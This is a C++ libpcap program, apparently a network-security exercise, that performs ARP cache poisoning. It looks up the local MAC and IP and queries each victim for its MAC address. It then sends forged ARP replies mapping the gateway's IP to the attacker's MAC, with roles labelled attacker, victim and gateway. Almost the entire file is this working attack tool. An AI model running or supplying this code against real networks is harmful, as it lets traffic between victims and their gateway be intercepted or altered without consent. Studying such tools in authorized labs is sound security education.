#include <cstdio>
#include <iostream>
#include <string>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "mac.h"
#include "ip.h"

#include <sys/ioctl.h> // struct ifreq, ioctl
#include <net/if.h> // ..
#include <sys/socket.h> // socket
#include <unistd.h> // close(fd)
#include <netinet/in.h> // htons
using namespace std;
#pragma pack(push, 1)

struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

struct User {
    Mac mac;
    Ip ip;
};

#pragma pack(pop)

void usage() {
    cout << "syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n";
    cout << "sample: send-arp wlan0 192.168.10.2 192.168.10.1\n";
    //printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    //printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

Mac get_mymac(const char* dev){
    struct ifreq ifr;
    u_char ret[32]={0,};

    int sock = socket(AF_INET,SOCK_DGRAM,IPPROTO_IP);
    if(sock==-1){
        cerr << "mac socket open error\n";
        //fprintf(stderr,"mac socket open error\n");
        close(sock);
        exit(1);
    }

    strncpy(ifr.ifr_name,dev,IFNAMSIZ);
    if(ioctl(sock,SIOCGIFHWADDR,&ifr)!=0){
        cerr << "mac ioctl error\n";
        //fprintf(stderr,"mac ioctl error\n");
        close(sock);
        exit(1);
    }

    close(sock);
    memcpy(ret,ifr.ifr_hwaddr.sa_data,6);
    return Mac(ret);

}

Ip get_myip(const char *dev){
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock==-1){
        cerr << "ip socket open error\n";
        //fprintf(stderr,"ip socket open error\n");
        close(sock);
        exit(1);
    }

    ifr.ifr_addr.sa_family=AF_INET;
    strncpy(ifr.ifr_name,dev,IFNAMSIZ);
    if(ioctl(sock,SIOCGIFADDR,&ifr)!=0){
        cerr << "ip ioctl error\n";
        //fprintf(stderr,"ip ioctl error\n");
        close(sock);
        exit(1);
    }

    close(sock);
    return Ip(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));

}

int send_arp(pcap_t* handle, struct User source, struct User target, uint16_t opcode){

    EthArpPacket packet;

    packet.eth_.dmac_ = (opcode==ArpHdr::Request)?target.mac.broadcastMac():target.mac;
    packet.eth_.smac_ = source.mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(opcode);
    packet.arp_.smac_ = source.mac;
    packet.arp_.sip_ = htonl(source.ip);
    packet.arp_.tmac_ = (opcode==ArpHdr::Request)?target.mac.nullMac():target.mac;
    packet.arp_.tip_ = htonl(target.ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        cerr << "pcap_sendpacket return " << res << " error=" << pcap_geterr(handle) << "\n";
        //fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return 0;
    }

    return 1;

}

EthArpPacket* recv_arp(pcap_t* handle, struct User source, struct User target){

    EthArpPacket* ret=nullptr;

    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res=pcap_next_ex(handle,&header,&packet);
        if(res==0)continue;
        if(res==PCAP_ERROR||res==PCAP_ERROR_BREAK){
            cout << "pcap_next_ex return " << res << "(" << pcap_geterr(handle) << ")\n";
            //printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        ret = (EthArpPacket*)packet;

        if(ret->eth_.type_!=htons(EthHdr::Arp))continue;
        //if(ret->eth_.dmac_!=source.mac)continue;
        if(ret->arp_.tip_!=htonl(source.ip)/*||ret->arp_.tmac_!=source.mac*/)continue;
        if(ret->arp_.sip_!=htonl(target.ip))continue;
        if(ret->arp_.op_!=htons(ArpHdr::Reply))continue;

        break;
    }

    return ret;
}

int main(int argc, char* argv[]) {
    if (argc % 2 != 0 || argc < 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
        cerr << "couldn't open device " << dev << "(" << errbuf << ")\n";
        //fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    struct User attacker={get_mymac(dev),get_myip(dev)};
    //Mac attacker_mac=get_mymac(dev);
    //Ip attacker_ip=get_myip(dev);
    cout << "Attacker's IP: " << string(attacker.ip) << "\n";
    cout << "Attacker's Mac: " << string(attacker.mac) << "\n";

    for(int i=2;i<argc;i+=2){
        struct User sender,target; // victim, gateway
        sender.ip=Ip(argv[i]);
        target.ip=Ip(argv[i+1]);

        cout << "Requesting sender's Mac\n";
        if(send_arp(handle,attacker,sender,ArpHdr::Request)==0){
            cerr << "request sender mac error\n";
            //fprintf(stderr,"request sender mac error\n");
            continue;
        }

        EthArpPacket* sender_packet=recv_arp(handle,attacker,sender);
        if(sender_packet==nullptr){
            cerr << "recv arp error\n";
            //fprintf(stderr,"recv arp error\n");
            continue;
        }

        sender.mac=Mac(sender_packet->arp_.smac());
        cout << "Sender's IP: " << string(sender.ip) << "\n";
        cout << "Sender's Mac: " << string(sender.mac) << "\n";

        cout << "Replying to sender(target_ip's Mac address->Attacker's Mac address)\n";

        struct User jjambbong = {attacker.mac,target.ip};
        send_arp(handle,jjambbong,sender,ArpHdr::Reply);

    }
	pcap_close(handle);
}
